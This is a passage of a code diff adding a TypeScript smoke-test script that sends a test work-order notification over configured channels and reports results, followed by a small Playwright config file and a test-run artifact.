+  }
+
+  if (result.failed === result.attempted) {
+    return {
+      status: "failed",
+      failureReason: "All notification attempts failed",
+    };
+  }
+
+  return {
+    status: "partial_failure",
+    failureReason: `${result.failed} of ${result.attempted} channel attempts failed`,
+  };
+}
+
+async function main(): Promise<void> {
+  console.log("🔔 Running notification smoke test...");
+
+  const channels = parseChannels(process.argv.slice(2));
+  console.log(`• Channels: ${channels.join(", ")}`);
+
+  validateEnv(channels);
+
+  const recipient: NotificationRecipient = {
+    userId: requireEnv("NOTIFICATIONS_SMOKE_USER_ID"),
+    name: requireEnv("NOTIFICATIONS_SMOKE_NAME"),
+    email: requireEnv("NOTIFICATIONS_SMOKE_EMAIL"),
+    phone: process.env.NOTIFICATIONS_SMOKE_PHONE,
+    preferredChannels: channels,
+  };
+
+  if (channels.some((channel) => channel === "sms" || channel === "whatsapp")) {
+    recipient.phone = requireEnv("NOTIFICATIONS_SMOKE_PHONE");
+  }
+
+  const workOrderId =
+    process.env.NOTIFICATIONS_SMOKE_WORKORDER_ID ||
+    `SMOKE-${new Date()
+      .toISOString()
+      .replace(/[-:TZ.]/g, "")
+      .slice(0, 12)}`;
+  const tenantName =
+    process.env.NOTIFICATIONS_SMOKE_TENANT || "Smoke Test Tenant";
+
+  const notification = buildNotification(
+    "onTicketCreated",
+    {
+      workOrderId,
+      tenantName,
+      technicianName: recipient.name,
+      description: "Automated smoke test notification",
+      priority: "high",
+    },
+    [recipient],
+  );
+
+  let dbConnected = false;
+  if (channels.includes("push")) {
+    console.log("• Connecting to MongoDB for push token lookup...");
+    await connectToDatabase();
+    dbConnected = true;
+  }
+
+  try {
+    const result = await sendBulkNotifications(
+      notification,
+      notification.recipients,
+    );
+    const derivedStatus = deriveStatus(result);
+
+    notification.status = derivedStatus.status;
+    notification.failureReason = derivedStatus.failureReason;
+    notification.sentAt = new Date();
+
+    await emitNotificationTelemetry({
+      notificationId: notification.id,
+      event: notification.event,
+      status: notification.status,
+      attempted: result.attempted,
+      failed: result.failed,
+      skipped: result.skipped,
+      issues: result.issues,
+    });
+
+    if (result.issues.length > 0) {
+      console.log("\n⚠️  Issues:");
+      for (const issue of result.issues) {
+        console.log(
+          `   - ${issue.channel} • user ${issue.userId}: ${issue.type} (${issue.reason})`,
+        );
+      }
+    }
+
+    console.log("\n📊 Result:", {
+      attempted: result.attempted,
+      succeeded: result.succeeded,
+      failed: result.failed,
+      skipped: result.skipped,
+      status: notification.status,
+      failureReason: notification.failureReason,
+    });
+
+    if (notification.status === "sent") {
+      console.log("\n✅ Notification smoke test succeeded.");
+      process.exitCode = 0;
+    } else if (notification.status === "partial_failure") {
+      console.log(
+        "\n⚠️  Notification smoke test completed with partial failures.",
+      );
+      process.exitCode = 2;
+    } else {
+      console.error("\n❌ Notification smoke test failed.");
+      process.exitCode = 1;
+    }
+  } catch (error) {
+    logger.error(
+      "[SmokeTest] Unexpected failure",
+      error instanceof Error ? error : undefined,
+      { error },
+    );
+    console.error("\n❌ Smoke test execution failed:", error);
+    process.exitCode = 1;
+  } finally {
+    if (dbConnected) {
+      await disconnectFromDatabase();
+    }
+  }
+}
+
+main().catch((error) => {
+  logger.error(
+    "[SmokeTest] Fatal error",
+    error instanceof Error ? error : undefined,
+    { error },
+  );
+  console.error("\n❌ Smoke test crashed:", error);
+  process.exit(1);
+});
+
+]]>
+</file>
+
+<file path="qa/playwright.config.ts">
+<![CDATA[
+import config from "../playwright.config";
+
+export default config;
+
+]]>
+</file>
+
+<file path="qa/qa/artifacts/.last-run.json">
+<![CDATA[
+{
+  "status": "interrupted",
+  "failedTests": []
+}
+
+]]>
+</file>
+
+</batch_content>
